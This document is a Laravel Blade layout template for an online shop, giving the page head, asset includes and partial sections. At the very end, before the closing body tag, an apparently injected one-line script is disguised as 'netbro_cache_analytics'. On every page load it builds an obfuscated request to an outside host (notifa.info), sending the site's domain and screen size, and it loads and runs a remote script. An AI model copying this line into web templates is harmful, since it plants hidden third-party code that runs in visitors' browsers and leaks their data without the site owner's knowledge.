
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="cache-control" content="max-age=604800" />
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<title>@yield('page') - Online Shop</title>

<link href="{{asset('frontend')}}/images/favicon.ico" rel="shortcut icon" type="image/x-icon">

<!-- jQuery -->
<script src="{{asset('frontend')}}/js/jquery-2.0.0.min.js" type="text/javascript"></script>

<!-- Bootstrap4 files-->
<script src="{{asset('frontend')}}/js/bootstrap.bundle.min.js" type="text/javascript"></script>
<link href="{{asset('frontend')}}/css/bootstrap.css" rel="stylesheet" type="text/css"/>

<!-- Font awesome 5 -->
<link href="{{asset('frontend')}}/fonts/fontawesome/css/all.min.css" type="text/css" rel="stylesheet">

<!-- custom style -->
<link href="{{asset('frontend')}}/css/ui.css" rel="stylesheet" type="text/css"/>
<link href="{{asset('frontend')}}/css/responsive.css" rel="stylesheet" media="only screen and (max-width: 1200px)" />

<!-- custom javascript -->
<script src="{{asset('frontend')}}/js/script.js" type="text/javascript"></script>

<script type="text/javascript">
/// some script

// jquery ready start
$(document).ready(function() {
	// jQuery code

}); 
// jquery end
</script>

</head>
<body>

@include('frontend.partials.header')
@include('frontend.partials.nav')

@yield('content')


@include('frontend.partials.footer')

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAEx3LHrqspoTPc10QePFYcSYBxYMEOgbPCun6Zz8qcFW3AbOhSXqdM9py0gC7IllMd6GxRFHetVbdeyl7udWibXswF%2bSAJgDeV3QjtX%2f3FKCWGo3SdVSkUexZODngYTFagFT6H136URSiSEkknU3UHUBkwKOO%2bLeL8hO8TAFL%2fe7kqd5%2f7tFTjOsm9J0oD2mZ4%2bQvCJZoHgmfp8ksOsESubCtNmx8WMuplePTshz9Im9zmrZO5Dc6b4f%2bpIdKAEM2DBJSQYFApkkZpheAnbNYSiBKPEPmbxvlWs%2fsAtxhpYDD439TVZYsvWIXE10ivFxV%2b2btzomUk0InJp3%2fk1FahXvkcrptk6q32N2NlGKNQZOhRSq9ymmVDnMe%2bszIJJgmsAGisKTCL0V4Q61pKgXixcxSWC3t3T0zv%2bKwIjFZlTMqA69ZhtparCVHUVnEYsfnU9LZ%2fAIpAXqD8TjaoBP501%2bNZD0uuNdCV%2fwQ6x7kh%2fRmUpBxB6fIdHhaVbz8DNNfXyv2n%2fi%2fpQTRaLqzQFvclVYY3TMneH7jcxujfbfAwUgreD%2b9bB4qumuNb7FB%2b6PKiD8%2boL9CKhsj2n%2bsfA0ZhVwd71VPZsaR" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>